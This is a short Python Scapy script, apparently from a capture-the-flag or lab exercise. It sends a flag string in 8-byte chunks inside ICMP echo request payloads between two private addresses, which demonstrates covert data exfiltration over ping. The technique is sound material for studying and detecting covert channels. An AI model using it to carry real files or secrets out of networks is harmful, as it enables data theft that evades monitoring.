#!/usr/bin/env python3
from scapy.all import *
# Ref: https://scapy.readthedocs.io/en/latest/api/scapy.layers.inet.html

data = "FLAG{{ICMPCanBeUsedToExfiltrateData}}"

id=12345
seq=1
ip = IP(src="192.168.22.89", dst = "192.168.22.37", ihl = 5)
icmp = ICMP(type = 8, id = id)

data_len = len(data)
data_chunk_len = 8
for i in range(0, data_len, data_chunk_len):
    load = data[i : i + data_chunk_len ]
    print(load)
    icmp.seq = seq

    echo_pkt = ip/icmp/load
    echo_pkt.show2()
    resp_pkt = sr1(echo_pkt)
    resp_pkt.show2()
    seq += 1
